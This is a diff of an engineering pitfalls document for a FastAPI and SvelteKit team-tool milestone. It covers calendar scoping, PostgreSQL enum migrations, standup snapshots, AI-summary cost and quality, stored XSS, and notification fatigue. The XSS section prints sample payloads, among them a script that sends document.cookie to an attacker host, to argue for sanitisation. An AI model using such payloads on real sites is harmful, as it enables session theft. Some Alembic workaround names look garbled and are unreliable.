@@ -1,309 +1,292 @@
-# Domain Pitfalls: TeamFlow Milestone 2
+# Domain Pitfalls: TeamFlow Milestone v2.2
 
-**Domain:** Adding multi-team hierarchy, sprint model, custom Kanban statuses, task types, and advanced KPIs to an existing FastAPI + SvelteKit 5 + PostgreSQL 16 app
-**Researched:** 2026-04-24
-**Applies to:** Subsequent milestone on a working app with real data
-
----
-
-## Risk 1: Multi-Team Hierarchy Migration — Unscoped Data Leakage After Re-association
-
-**Problem**
-
-The existing `Project`, `Task`, `User`, and `TeamInvite` models have no `team_id` or `organization_id` column. The current data model is flat: all users, all projects, and all tasks exist in one implicit global namespace. Adding `Organization → sub-team → member` hierarchy requires adding foreign key columns to `users`, `projects`, and possibly `tasks`.
-
-The critical failure mode is **not the migration itself — it is forgetting to add WHERE clauses to the query layer after migration**. Every existing endpoint (`GET /api/tasks/`, `GET /api/projects/`, `GET /api/performance/team`, `GET /api/timeline/`) returns data without any team-scoping filter. Once hierarchy is introduced, a supervisor in Sub-Team A can still query `/api/tasks/?project_id=7` and get tasks belonging to Sub-Team B's project if the API is not updated.
-
-The existing `require_supervisor` guard in `auth.py` only validates role — it does not validate team membership. It is easy to add hierarchy to models and migrations but miss six query endpoints that need a `WHERE project.team_id = current_user.team_id` predicate.
-
-**Signs**
-
-- A supervisor can hit `/api/tasks/` and see tasks from another team's project when filtered by `project_id`
-- The `GET /api/performance/team` endpoint (which does a full `User` table scan joined to `Task`) returns members who belong to other sub-teams
-- The timeline endpoint returns all projects (current implementation: `select(Project)` with no team filter)
-- Dashboard stats (`/api/dashboard/`) aggregate across all teams
-
-**Prevention**
-
-- Add a `team_id` column to `projects` first (nullable initially; then backfill; then NOT NULL)
-- Write a helper `get_team_for_user(current_user)` that returns the user's team_id; use this as a mandatory join/filter in every endpoint that touches Projects or Tasks
-- Audit every `select(Task)` and `select(Project)` call in all routers before marking the phase complete — there are currently 7 files to check: `tasks.py`, `projects.py`, `milestones.py`, `timeline.py`, `performance.py`, `dashboard.py`, `ai.py`
-- Write a test: authenticate as Supervisor-A, create a task under Team-B's project via `project_id`, assert 403 or 404
-
-**Phase to address:** Phase that introduces multi-team hierarchy models and migration
+**Domain:** Adding standup/updates, Knowledge Sharing Scheduler, and AI-summarized Weekly Board to an existing FastAPI + SvelteKit 5 + PostgreSQL 16 team tool
+**Researched:** 2026-04-28
+**Applies to:** Subsequent milestone on a working app (v2.1 refactor complete, stable migration chain)
 
 ---
 
-## Risk 2: Custom Kanban Statuses — Hardcoded Enum Breaks the Frontend and AI Layer
+## 1. Calendar Integration — `Schedule` Model Is User-Scoped, KS Sessions Are Team-Scoped
 
-**Problem**
+### Risk
 
-`TaskStatus` is a Python enum with five hardcoded values (`todo`, `in_progress`, `review`, `done`, `blocked`). This enum is used in:
+The existing `Schedule` model (`backend/app/models/work.py`) has `user_id = Column(Integer, ForeignKey("users.id"), nullable=False)`. Every schedule query in `routers/schedules.py` filters by `Schedule.user_id == current_user.id`. This is a personal calendar.
 
-- `models.py` — the `status` DB column is typed `Enum(TaskStatus)`
-- `schemas.py` — `TaskCreate`, `TaskUpdate`, `TaskOut` all accept/emit `TaskStatus`
-- `tasks.py` — the `_AI_PARSE_SYSTEM_PROMPT` explicitly lists `todo|in_progress|review|done|blocked` as valid values
-- `KanbanBoard.svelte` — `const columns = ['todo', 'in_progress', 'review', 'done', 'blocked']` is hardcoded
-- `AgileView.svelte` — `statusCycle` is a hardcoded map of status transitions
-- `utils` — `statusLabels` and `statusColors` are hardcoded maps
+Knowledge Sharing sessions are team-wide events: any team member must be able to see them (read-only), only supervisors/admins can create/edit them. If the KS sessions are stored in the existing `Schedule` table with a flag field, the `GET /api/schedules/` endpoint will silently exclude them from members' views because of the `user_id` filter — sessions created by the supervisor will be invisible to the team.
 
-Migrating to DB-driven statuses requires changing the PostgreSQL column type from an `ENUM` type (PostgreSQL native enum `taskstatus`) to a `VARCHAR` referencing a `kanban_statuses` table. PostgreSQL `ALTER TYPE` cannot remove enum values. The migration to drop the `taskstatus` type requires: create new VARCHAR column, copy data, drop old column, rename — a three-step destructive migration that must be done correctly or existing rows get NULL statuses.
+Two bad paths people take here:
 
-Additionally, the AI parse prompt must be updated dynamically (or prompted with the current status list at runtime) otherwise the AI will still produce only the old five values.
+1. **Reuse `Schedule` with a `user_id = supervisor_id`** — members cannot see them; the filter gates them out.
+2. **Remove the `user_id` filter from `GET /api/schedules/`** — personal events from all users leak to everyone.
 
-**Signs**
+The right path is a separate `KnowledgeSession` model (or a `team_id`-scoped event table), served via a separate router with its own visibility rules: supervisor creates, all team members can read.
 
-- Alembic migration fails with `cannot drop type taskstatus because other objects depend on it`
-- AI task parse returns `status: "todo"` even after old enum values are deprecated
-- KanbanBoard renders only five hardcoded columns regardless of DB-configured statuses
-- Drag-and-drop assigns a status string that no longer exists in the status list, silently setting invalid state
+### Prevention
 
-**Prevention**
+- Create a dedicated `knowledge_sessions` table. Do not add a `type` discriminator to `schedules`; the ownership semantics are incompatible.
+- The `GET /api/knowledge-sessions/` endpoint applies no `user_id` filter — it returns all sessions visible to the authenticated user's team.
+- The calendar frontend (`schedule/+page.svelte`) currently merges two event sources: `schedules` (personal) and `tasks` (due-dates). Add KS sessions as a third source in the same `EventItem` union type with `source: 'knowledge-session'` to render them differently (read-only, no edit controls for members).
+- Apply the RBAC check at creation: `require_supervisor` or `is_admin` for POST/PATCH/DELETE; any authenticated user for GET.
 
-- The migration must use a multi-step approach:
-  1. Add `status_new VARCHAR(50)` column with default `'todo'`
-  2. `UPDATE tasks SET status_new = status::text`
-  3. Add FK constraint `status_new REFERENCES kanban_statuses(slug)`
-  4. Drop old `status` column (this releases the enum type dependency)
-  5. Rename `status_new` to `status`
-  6. Drop `taskstatus` enum type
-- Keep `done` as a reserved slug that the system recognizes for completion logic — the `completed_at` field is populated when status transitions to `done`, so this slug must always exist and never be renamed
-- The frontend `statusLabels`, `statusColors`, and `statusCycle` maps must become API-driven; fetch statuses once at app init and store in a Svelte store
-- Add a `is_terminal` boolean to the `kanban_statuses` table to replace the hardcoded `done` check in `update_task`
-- Update the AI parse prompt to inject current valid status slugs at request time rather than hardcoding them in the system prompt string
+### Phase
 
-**Phase to address:** Phase that adds custom Kanban statuses; must run the multi-step migration in a single Alembic revision
+Address in the phase that introduces the Knowledge Sharing Scheduler. Do not attempt to piggyback on the existing `Schedule` model.
 
 ---
 
-## Risk 3: Sprint Model — Orphaned Tasks When Sprints End
+## 2. Calendar Integration — Notification System Uses a PostgreSQL Enum for `event_type`
 
-**Problem**
+### Risk
 
-A sprint is a time-boxed container. Tasks assigned to a sprint that are not completed when the sprint ends become "orphaned" — they have a `sprint_id` pointing to a closed sprint. Without an explicit policy, these tasks remain assigned to the old sprint indefinitely. Velocity calculations (tasks completed per sprint) then reflect only what was finished, and the backlog never surfaces these orphaned tasks in the next sprint's burndown.
+`NotificationEventType` in `backend/app/models/enums.py` is a Python `str(enum.Enum)` that maps to a PostgreSQL native ENUM type. Adding a new notification event type (e.g., `knowledge_session`) requires an Alembic migration that runs `ALTER TYPE notificationeventtype ADD VALUE 'knowledge_session'`.
 
-The burndown accuracy problem compounds this: if burndown is computed as `(tasks_in_sprint WHERE status != done) / total_tasks_in_sprint`, adding tasks to a sprint mid-sprint inflates the starting point retroactively, making the burndown chart show an impossible "upward" movement (scope creep without documentation).
+PostgreSQL has a specific constraint: `ALTER TYPE ... ADD VALUE` cannot run inside a transaction. Alembic by default wraps each migration in a transaction. If this migration is written as a normal `op.execute(...)` call inside the default transactional context, it will fail in PostgreSQL with:
 
-**Signs**
+> `ERROR: ALTER TYPE ... ADD VALUE cannot run inside a transaction block`
 
-- Tasks with `sprint_id = 5` (a closed sprint) still appear with `status = 'in_progress'`
-- Burndown chart shows total work going up mid-sprint (new tasks added without recording a scope-change event)
-- Velocity metric overstates the team's throughput because it counts tasks from multiple sprints
+This fails silently during development if you are using SQLite (which does not enforce this constraint) but breaks on the real PostgreSQL instance.
 
-**Prevention**
+The existing migration `a1b2c3d4e5f6_add_role_enum.py` in the chain is the reference pattern — it must be checked to confirm whether it used `render_as_batch` or `op.execute` directly.
 
-- Add a `sprint_id` column to `tasks` (nullable; `SET NULL ON DELETE` is wrong here — use `RESTRICT` or keep a soft reference and handle in application logic)
-- Add a `sprint_status` enum to `Sprint` (`planning`, `active`, `completed`) and enforce at the API level: once a sprint is `completed`, tasks cannot be added to it
-- Implement an explicit "sprint close" operation that: sets unfinished tasks' `sprint_id` to the next sprint (or NULL if no next sprint exists), records a `SprintSnapshot` row capturing the state at close time for accurate historical burndown
-- For burndown accuracy, use a **snapshot model**: on sprint start, write a `sprint_daily_snapshots` table with `(sprint_id, date, remaining_count)` via the scheduler job. Compute burndown from snapshots, not live task counts
-- Add a `scope_change_log` table or a `scope_change_count` field on `Sprint` so the UI can flag sprints where scope changed
+### Prevention
 
-**Phase to address:** Phase that introduces the Sprint model; burndown snapshot job added in the same phase as sprint creation
+- In the Alembic migration that adds the new `NotificationEventType` value, set `transaction_per_migration = False` or execute it using `op.execute("ALTER TYPE notificationeventtype ADD VALUE 'knowledge_session'")` inside an `execute_if` context that disables transaction wrapping. The standard pattern is to add a `alembic_version_table` entry manually or use `schema_migrations_without_tx`.
+- Simpler alternative: avoid extending the PostgreSQL enum at all. Store the new event type as a VARCHAR column with a CHECK constraint. Only do this for newly added tables, not for the existing `event_notifications.event_type` column (which cannot be changed without a migration).
+- Test the migration against the PostgreSQL container (not SQLite) in the phase's verification step — the CI pipeline must run against Postgres.
+- The notification router's `_resolve_event` function has a hardcoded `if event_type == NotificationEventType.schedule` / `if event_type == NotificationEventType.task` dispatch. Adding `knowledge_session` requires adding a branch here, or the notification bell will fail to resolve KS session reminders.
 
----
+### Phase
 
-## Risk 4: Task Types — Backfill Strategy Causes KPI Skew
-
-**Problem**
-
-Every existing task has no `task_type` field. When task types (`feature`, `bug`, `task`, `improvement`) are added, the backfill decision determines how useful historical KPI data will be. There are three choices, all with drawbacks:
-
-1. **Default all existing tasks to `task`** — cycle time and defect rate by type will show zero bugs in history, making historical defect-rate metrics meaningless
-2. **Leave existing tasks NULL** — KPI queries must handle NULL in GROUP BY aggregations; easy to forget, producing misleading percentages (e.g., defect rate = bugs/total where total excludes NULL-typed tasks)
-3. **Force users to classify retroactively** — operationally impractical; supervisors will not do it
-
-The third option (AI classification at migration time) is attractive but risky: the AI classifies based on task title and description, and a wrong batch classification corrupts historical KPI baselines permanently.
-
-**Signs**
-
-- `GET /api/kpi/defect-rate` returns 0% for all historical periods (because all old tasks are `task` type)
-- Velocity-by-type chart shows only `feature` and `bug` types for recent tasks, making the chart look empty for older sprints
-- GROUP BY `task_type` returns a mix of `NULL` and valid values, inflating the `task` bucket
-
-**Prevention**
-
-- Add `task_type VARCHAR(20) DEFAULT 'task' NOT NULL` in the migration; backfill all existing rows to `'task'`
-- Make KPI queries that break down by type explicitly exclude or document the historical baseline period: `WHERE created_at >= [milestone2_start_date]`
-- Add a database constraint (`CHECK task_type IN (...)`) so future inserts cannot produce NULL types
-- Document the limitation in the KPI dashboard UI: "Historical data before [date] is classified as 'task'; type breakdown is accurate from [date] forward"
-- Do not use AI batch-classification during migration; the risk of silent mis-classification on hundreds of rows with no rollback path outweighs the benefit
-
-**Phase to address:** Phase that adds task types; migration must include a backfill, and KPI queries must account for the historical gap
+Address in the same phase as Knowledge Sharing Scheduler. The enum extension and the `_resolve_event` dispatch update must be in the same PR.
 
 ---
 
-## Risk 5: Advanced KPIs — N+1 Queries on Analytics Endpoints
+## 3. Standup Post Task Snapshot — Snapshot vs Live Query
 
-**Problem**
+### Risk
 
-The existing `performance.py` already issues two separate queries per page load (metrics + collaboration count). Milestone 2 KPI endpoints (velocity per sprint, burndown per sprint, cycle time by type, defect rate) will need data from `sprints`, `tasks`, `task_type`, and potentially `sprint_daily_snapshots`. The N+1 pattern emerges when:
+The standup post must include "a snapshot of the member's current task statuses." There are two interpretations:
 
-- Velocity is computed by iterating over sprints and issuing a `SELECT count(*) FROM tasks WHERE sprint_id = ?` per sprint
-- Cycle time by type issues a per-type query inside a loop
-- Burndown fetches snapshot rows per sprint in a loop
-- The timeline endpoint already has a secondary query inside its project loop (`unassigned_stmt` is executed per project — this is an existing N+1)
+1. **Live query at render time** — fetch the member's current tasks each time the standup post is displayed.
+2. **Frozen snapshot at post time** — serialize task statuses into the standup record at the moment of submission.
 
-For a team of 5-15 people with 10 sprints and 4 task types, N+1 patterns produce 40-100 queries on a single analytics page load. On Azure App Service B1 with a remote PostgreSQL instance (10-20ms round-trip per query), this adds 400ms-2000ms latency to dashboard loads.
+Path 1 is tempting because it requires no extra storage and always shows up-to-date task state. But it is semantically wrong: a standup post records what was true *when the member submitted it*, not what is true today. If task A was `in_progress` when the standup was posted Monday but moved to `done` by Tuesday, the Monday standup should still show `in_progress`.
 
-**Signs**
+Path 2 (frozen snapshot as JSON) requires `JSONB` or `TEXT` storage and a deliberate schema choice. The risk is skipping this and using path 1, then discovering six weeks later that historical standups are meaningless because they reflect current state, not the state at the time of posting.
 
-- KPI endpoint takes >1 second for a team with 50+ tasks
-- SQLAlchemy debug logs show repeated `SELECT count(*) FROM tasks WHERE sprint_id = X` for each sprint
-- Adding a second supervisor causes analytics page to become noticeably slower
+### Prevention
 
-**Prevention**
+- Store the task snapshot as a `JSONB` column on the standup model: `task_snapshot = Column(JSONB, nullable=True)`. At post time, serialize `[{task_id, title, status, priority}]` for the member's assigned tasks.
+- The API endpoint that creates a standup post fetches `SELECT tasks WHERE assignee_id = current_user.id` and serializes the result into `task_snapshot` before inserting the row. The client does not send this data — it is server-generated.
+- The `GET /api/standups/{id}` response returns `task_snapshot` as-is; the frontend renders it as a read-only status list.
+- Do not use a separate `standup_task_items` join table unless you need to query across snapshots by task. For this feature's scope, JSONB is simpler and sufficient.
 
-- Write all KPI aggregations as single GROUP BY queries: `SELECT sprint_id, count(*), avg(cycle_time) FROM tasks GROUP BY sprint_id` rather than per-sprint subqueries
-- Use `func.count(Task.id).filter(...)` with aggregate filters (pattern already used in `performance.py`) — replicate this pattern for sprint and type breakdowns
-- Fix the existing N+1 in `timeline.py`: the `unassigned_stmt` inside the project loop is a pre-existing issue; fix it in the same phase by fetching all unassigned tasks in one query keyed by `project_id`
-- Add a `EXPLAIN ANALYZE` test in the phase review for any new analytics endpoint with >5 tasks in the dataset
-- For burndown, do not recompute from raw task history on each request; read from the `sprint_daily_snapshots` table (written by the scheduler) instead
+### Phase
 
-**Phase to address:** Phase that adds KPI analytics endpoints; timeline N+1 fix can be included as a related data-access improvement
+Address in the phase introducing standup posts. The snapshot strategy must be decided before writing the migration — changing it later requires a data migration.
 
 ---
 
-## Risk 6: Timeline Visibility — Role-Scoped Filtering Forgotten at the API Level
+## 4. AI Weekly Summary — Unbounded Input Size and Cost
 
-**Problem**
+### Risk
 
-The requirement states: members see only projects they are assigned to; supervisors see their team-wide view. The current `GET /api/timeline/` implementation does `select(Project)` with no filter — it returns all projects to any authenticated user regardless of role.
+The Weekly Board AI summary will call `acompletion(...)` (the existing LiteLLM wrapper in `backend/app/utils/ai_client.py`) with the text of all board posts from the current week. For a team of 15 people each writing 200–500 word posts over five days, that is 15,000–37,500 tokens of input — plus the summary prompt overhead. At GPT-4o pricing, a single weekly summary call could cost $0.15–$0.60. With on-demand triggering (any supervisor can call it repeatedly), costs can spiral.
 
-The SvelteKit frontend enforces visibility via UI (hiding sections, conditional rendering), but the API returns all data. Frontend-only filtering is not a security boundary: any team member can call `GET /api/timeline/` directly and see all projects, milestones, and assignee information for other teams.
+The existing AI router has no token budget enforcement, no caching, and no deduplication. The project summary endpoint (`POST /api/ai/projects/{project_id}/summary`) does not save its output — it regenerates on every call. Replicating that pattern for the Weekly Board means the same posts are summarized repeatedly with full token costs each time.
 
-This pattern will silently persist into Milestone 2 if the team hierarchy phase only adds the data models without auditing the timeline router. The `require_supervisor` guard is used correctly in `performance.py` but is absent from `timeline.py` (which currently accepts any authenticated user).
+Additionally, if no posts exist for the week, sending an empty input to the AI produces hallucinated summaries. The AI will invent fictional updates.
 
-**Signs**
+### Prevention
 
-- A member (not supervisor) hits `GET /api/timeline/` and receives projects they have no tasks in
-- After adding team hierarchy, a member from Sub-Team A can view timeline data for Sub-Team B's projects
-- The SvelteKit timeline component is conditionally rendering things the API should never have sent in the first place
+- Store the generated summary as a column on a `WeeklyBoard` model: `ai_summary = Column(Text, nullable=True)`, `ai_summary_generated_at = Column(DateTime, nullable=True)`.
+- On-demand generation: if `ai_summary_generated_at` is within the last N minutes (configurable, default 30), return the cached value instead of re-invoking the AI. This prevents rapid repeat clicks from triggering duplicate calls.
+- Enforce a token budget at the application level: truncate or summarize individual posts before sending them to the AI if total character count exceeds a threshold (e.g., 50,000 characters). Truncate oldest posts first, not the most recent.
+- Guard against empty input: if no posts exist, return a structured "no updates this week" response without calling the AI at all.
+- Apply a rate limit on the on-demand summary endpoint: `@limiter.limit("5/hour")` per user, consistent with the existing `@limiter.limit("30/minute")` pattern in `ai.py`.
+- For the auto-generated end-of-week summary, add a new APScheduler cron job (e.g., Sunday 23:59 UTC) alongside the existing `process_due_notifications` job in `internal/scheduler_jobs.py`. This job must check that the summary has not already been generated for the week before invoking the AI.
 
-**Prevention**
+### Phase
 
-- Add the team-scoping filter to `GET /api/timeline/` in the same phase that adds team hierarchy — not as a separate phase
-- For members: filter to `projects WHERE id IN (SELECT DISTINCT project_id FROM tasks WHERE assignee_id = current_user.id)`
-- For supervisors: filter to `projects WHERE team_id = current_user.team_id`
-- Write an integration test: authenticate as member, assert that timeline only contains projects with assigned tasks
-- Never rely on frontend conditional rendering as a data boundary; the test is "what does the raw API response contain?"
-
-**Phase to address:** Phase that adds multi-team hierarchy; timeline visibility enforcement must be a checklist item in that phase's completion criteria, not deferred
+Address in the Weekly Board phase. The caching strategy must be decided before implementation — retrofitting it onto a live endpoint with stored summaries is a schema change.
 
 ---
 
-## Risk 7: APScheduler Job Persistence — Sprint/Release Reminders Lost on Restart
+## 5. AI Weekly Summary — Quality: Generic Output and Prompt Design
 
-**Problem**
+### Risk
 
-The existing `scheduler_jobs.py` creates an `AsyncIOScheduler` with a single in-memory job (`process_due_notifications` every 60 seconds). The scheduler state is held in the Python process — there is no `APScheduler` job store configured, so `_scheduler` is an in-memory object. This is acceptable for the existing notification job because the `EventNotification` rows are in PostgreSQL; a restart only means a one-minute processing gap.
+Weekly summaries generated from a generic "summarize these posts" prompt will produce outputs like "The team had a productive week. Several tasks were completed. There were some blockers." This is useless. The value proposition of the AI summary is to give the supervisor an at-a-glance digest that surfaces blockers, completions, and themes across all team member updates.
 
-Sprint and release reminders are different: if reminders are implemented as one-off `scheduler.add_job(send_reminder, run_date=sprint.end_date - timedelta(days=1))` calls, those jobs are lost on every app restart. Azure App Service restarts instances on deployment, scale events, and occasional platform recycling. A sprint ending on Friday that had a reminder scheduled on Thursday will silently never fire if the app was restarted after the job was added but before it ran.
+Common quality failures:
 
-**Signs**
+- The AI lists updates sequentially rather than synthesizing across members.
+- Blockers are buried in prose instead of surfaced as a distinct list.
+- The AI makes up details not present in the posts (hallucination, especially when posts are vague).
+- The summary does not attribute updates to specific team members, so the supervisor cannot follow up.
 
-- Sprint-end reminders fire inconsistently; sometimes they work, sometimes they do not
-- After deploying a new version, all pending sprint reminders for the next 24 hours fail to fire
-- No mechanism to reconstruct which sprint reminders have already been sent vs are pending
+The existing AI system prompt (`SYSTEM_PROMPT` in `routers/ai.py`) is generic: "You are a helpful project management assistant." Reusing it for summaries will produce low-quality output.
 
-**Prevention**
+### Prevention
 
-- Do not store sprint/release reminders as APScheduler `run_date` jobs; store them as rows in the existing `EventNotification` table (the infrastructure already exists: `event_type`, `event_ref_id`, `remind_at`, `status`)
-- The existing `process_due_notifications` job already polls `EventNotification WHERE status = pending AND remind_at <= now` every 60 seconds — sprint reminders are free to use this system with no new scheduler infrastructure
-- When a sprint is created or its `end_date` is updated, insert/update `EventNotification` rows for the relevant users (e.g., supervisor gets a reminder 24 hours before sprint end)
-- If a sprint `end_date` changes, delete old `EventNotification` rows for that sprint's `event_ref_id` and re-insert with the new `remind_at`
-- Add a `(event_type, event_ref_id, user_id)` unique constraint to `EventNotification` to prevent duplicate reminder rows on repeated saves
+- Write a dedicated summary prompt that specifies the desired output structure. Example structure: (1) Key completions this week (with member names), (2) Active blockers (with member names and what is blocking them), (3) Recurring themes or patterns across updates. The prompt should explicitly say: "Do not invent information not present in the posts. If a category has no content, say 'None reported'."
+- Pass structured input to the AI: format each post as `[MEMBER: {name}]\n{post_body}\n` rather than raw concatenated text. This helps the AI attribute points to members.
+- Specify the desired output format (markdown with headers) in the prompt, since the summary will be rendered as markdown on the Weekly Board.
+- Test the prompt against a real week of test posts before finalizing the phase. Quality cannot be verified from unit tests — manual review of the output is required.
 
-**Phase to address:** Phase that adds sprint model and reminder notifications; no new APScheduler jobs needed — use the existing EventNotification row-poll pattern
+### Phase
 
----
-
-## Risk 8: Alembic Migration Chain — Enum Type Operations Break Multi-Step Migrations
-
-**Problem**
-
-The codebase has three Alembic revisions so far; `a1b2c3d4e5f6_add_role_enum.py` shows the pattern for changing an existing enum column on `users`. That migration works because `userrole` was not yet a PostgreSQL native type — it was added from scratch.
-
-Milestone 2 faces a harder problem: `taskstatus` is already a PostgreSQL native ENUM type (created implicitly by SQLAlchemy from `Enum(TaskStatus)` on the `tasks.status` column). Adding new values to a PostgreSQL ENUM is safe (`ALTER TYPE taskstatus ADD VALUE 'custom'`). But the custom Kanban statuses feature requires removing the enum entirely and switching to a VARCHAR foreign key — you cannot remove values from a PostgreSQL ENUM, only add them. Attempting to run `DROP TYPE taskstatus` while the `tasks.status` column still references it will fail with a dependency error.
-
-A second risk: if Milestone 2 adds an `Organization` table, `Team` table (with FK to org), `team_id` on `users` (with FK to team), and `team_id` on `projects` (with FK to team), all in separate migrations, the ordering constraint between migrations matters — deploying them out of order will fail with FK constraint violations.
-
-**Signs**
-
-- `alembic upgrade head` fails on the custom-status migration with `ERROR: cannot drop type taskstatus because other objects depend on it`
-- A migration adding `team_id` FK to `projects` runs before the migration creating the `teams` table, causing a foreign key error
-- Rollback (`alembic downgrade`) fails midway because the down path was not tested
-
-**Prevention**
-
-- Plan the Milestone 2 migration sequence explicitly before writing any migration file:
-  1. `organizations` table
-  2. `teams` table (FK to organizations)
-  3. `team_id` nullable column on `users` (FK to teams)
-  4. `team_id` nullable column on `projects` (FK to teams)
-  5. Backfill: assign all existing users and projects to a default team
-  6. `kanban_statuses` table (slug, label, order, is_terminal, team_id nullable)
-  7. Seed default five statuses
-  8. Multi-step taskstatus→VARCHAR migration (columns approach described in Risk 2)
-  9. `sprints` table (FK to milestones)
-  10. `sprint_id` nullable column on `tasks`
-  11. `task_type` VARCHAR column with default 'task', NOT NULL
-- Test each migration file's `downgrade()` path locally before merging
-- Never use `op.execute("ALTER TYPE ... ADD VALUE")` in a transaction block — PostgreSQL requires enum value additions to run outside a transaction; use `op.execute(...); op.get_bind().dialect.do_commit(op.get_bind().connection)` or set `transaction_per_migration = False` in Alembic env
-
-**Phase to address:** All phases that touch schema; the migration sequence must be drafted as a team artifact at the start of Milestone 2, not planned per-phase in isolation
+Address in the Weekly Board phase, specifically the AI prompt design step. Allow time for prompt iteration — at least one round of human review of generated output.
 
 ---
 
-## Risk 9: Burndown Accuracy — Computed vs Snapshot
+## 6. Markdown Rendering — XSS via User-Generated Content
 
-**Problem**
+### Risk
 
-Burndown charts are almost always implemented naively as: "query tasks in sprint, group by day of `completed_at`". This only works if no tasks are added or removed from the sprint after it starts. In practice, scope changes (adding tasks, removing tasks, changing estimates) mean the denominator of the burndown changes retroactively. A computed burndown from live data cannot accurately reconstruct "what was the state on day 3 of the sprint?"
+The frontend `package.json` contains no markdown rendering library (`marked`, `micromark`, `remark`) and no HTML sanitizer (`DOMPurify`, `sanitize-html`). The Weekly Board posts and standup posts will contain user-written markdown content.
 
-The existing `performance.py` uses live computation for all metrics. For trend data (8-week history), this works because historical task state does not change. But sprint burndown is different: a task added on day 5 of a 10-day sprint was not in scope on day 1, and the burndown chart should not back-project it.
+If the frontend renders markdown by passing raw content to `{@html someMarkdown}` in Svelte (the tempting shortcut), and the markdown is not sanitized, any team member can inject arbitrary HTML/JavaScript:
 
-**Signs**
+```markdown
+[click me](javascript:alert(document.cookie))
+<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+<img src=x onerror="...">
+```
 
-- The burndown chart for a completed sprint looks different each time it is loaded (if tasks were retroactively re-assigned)
-- Adding a task to a sprint mid-sprint makes the burndown chart start higher than it actually started, making the team look less productive than they were
-- Sprint velocity inconsistently changes for historical sprints (tasks re-assigned after sprint closed)
+Svelte's template engine does NOT sanitize `{@html}` — it is documented as unsafe for untrusted input. This is a stored XSS vulnerability: malicious content is saved to the database and executed for every user who views the board.
 
-**Prevention**
+The app uses JWT cookies for auth. If cookies are not `HttpOnly`, stored XSS enables session theft across the entire team.
 
-- Write a daily snapshot job: extend `process_due_notifications` in `scheduler_jobs.py` (or add a second job) that runs at midnight UTC and writes one row per active sprint to `sprint_daily_snapshots (sprint_id, date, total_tasks, remaining_tasks, added_today, completed_today)`
-- Burndown API endpoint reads from `sprint_daily_snapshots`, not from live task counts
-- On sprint start, write the initial snapshot immediately (do not wait for the first midnight job)
-- Velocity is computed from the snapshot table's `completed_today` sum for the sprint, not from a live count of `completed_at` within the sprint's date range
+### Prevention
 
-**Phase to address:** Phase that adds sprint model; the snapshot job must be added in the same phase as the sprint creation endpoint, not deferred to the KPI phase
+- Install a markdown renderer with built-in sanitization: **`marked` + `DOMPurify`** is the standard pair, or use **`marked` with the `sanitize` option** (deprecated in newer versions — prefer explicit DOMPurify). An alternative is `micromark` which does not produce HTML directly.
+- The safe rendering pattern in SvelteKit 5:
+  ```typescript
+  import { marked } from 'marked';
+  import DOMPurify from 'dompurify';
+  const safeHtml = DOMPurify.sanitize(marked.parse(rawMarkdown));
+  // then: {@html safeHtml}
+  ```
+- Do not use `{@html marked.parse(rawMarkdown)}` without sanitization under any circumstances.
+- Validate and sanitize markdown content on the backend as well (defense in depth): strip `<script>` tags, `javascript:` protocol links, and inline event handlers before storing to the database.
+- Add DOMPurify to `frontend/package.json` as a production dependency in the same PR that introduces markdown rendering. Do not defer this — the risk is present from the first rendered post.
+- Check that auth cookies are set with `HttpOnly=true` in the backend (the existing FastAPI auth flow should be audited in this phase).
+
+### Phase
+
+Address in the first phase that renders markdown (standup posts or Weekly Board, whichever comes first). Never introduce `{@html}` rendering without DOMPurify in the same commit.
 
 ---
 
-## Risk 10: TaskStatus / Completion Logic Tied to Hardcoded 'done' Slug
+## 7. Notification Fatigue — New Events Must Opt-In, Not Opt-Out by Default
 
-**Problem**
+### Risk
 
-In `tasks.py`, the `update_task` endpoint has logic that checks `if new_status == TaskStatus.done` to set `completed_at`. This works because `TaskStatus.done` is a known enum value. After migrating to DB-driven statuses, this check must use a different mechanism — either:
-- A hardcoded string `'done'` (fragile if the terminal status slug is renamed)
-- A lookup of the `is_terminal = true` status from `kanban_statuses` (correct but adds a DB lookup on every status update)
+The existing notification system triggers on: schedule reminders, task due dates, sprint end, milestone due, and reminder settings proposals. Adding three new feature areas (standup posts, knowledge sessions, weekly board) will introduce new notification event types. If all new notifications are enabled by default for all users, the notification bell becomes noise and users start ignoring it or hiding it entirely.
 
-If this logic is missed during the custom-status migration, tasks marked with a custom terminal status (e.g., `'released'`) will never have `completed_at` set. This corrupts cycle time, on-time rate, and all performance metrics that depend on `completed_at`.
+Specific failure modes:
+- Every standup post by a team member triggers a notification for every other member (N×M notifications per day for a 15-person team).
+- Every new KS session created triggers a notification to all 15 team members.
+- The weekly AI summary triggers a notification to all members even if they do not need to act on it.
 
-**Signs**
+The existing `EventNotification` model has no `muted` or `preference` mechanism. The `SubTeamReminderSettings` model controls sprint/milestone reminder toggles — but it is team-level, not user-level, and covers only sprint/milestone events.
 
-- Tasks transitioned to a custom terminal status show `completed_at = NULL`
-- KPI cycle time metric returns NULL for tasks completed with non-`done` statuses
-- Burndown chart never shows those tasks as "completed"
+### Prevention
 
-**Prevention**
+- Do not create `EventNotification` rows for standup posts at all — standup posts are pull (the supervisor checks them) not push. A single digest notification ("3 new standup updates today") is sufficient, not one per post.
+- For KS sessions: create a notification only for the session's presenter/assignee (they need to prepare), plus a single reminder to all team members 24 hours before the session (using the existing `remind_at` pattern).
+- For the weekly board summary: no notification unless the summary is new. Send one notification to the supervisor when the auto-generated summary is ready. Do not notify team members.
+- When adding new `NotificationEventType` values, evaluate each one against: "does this require immediate action from the recipient?" If no, do not use a notification.
+- If notification preferences per user are needed later, that is a separate feature — do not pre-build it in this milestone.
 
-- Add `is_terminal BOOLEAN NOT NULL DEFAULT FALSE` to the `kanban_statuses` table
-- In `update_task`, replace `if new_status == TaskStatus.done` with `if new_status_row.is_terminal`; the status row must be fetched or cached per request
-- The default five statuses seed should mark `done` as `is_terminal = true`; all others `false`
-- Cache the `is_terminal` flag on the task status string level (e.g., a `terminal_slugs` set loaded at startup from the DB) to avoid a per-update lookup
-- Test: create a custom `released` status with `is_terminal=true`, transition a task to it, assert `completed_at` is set
+### Phase
 
-**Phase to address:** Phase that adds custom Kanban statuses; must be addressed in the same migration that removes the `TaskStatus` enum
+Address in each phase as new notification-triggering events are introduced. The standup phase must explicitly decide "no per-post notifications." The KS scheduler phase must define the exact notification targets. The Weekly Board phase must confirm "summary-ready notification to supervisor only."
+
+---
+
+## 8. Schema Migration — Alembic Chain and PostgreSQL ENUM Extension
+
+### Risk
+
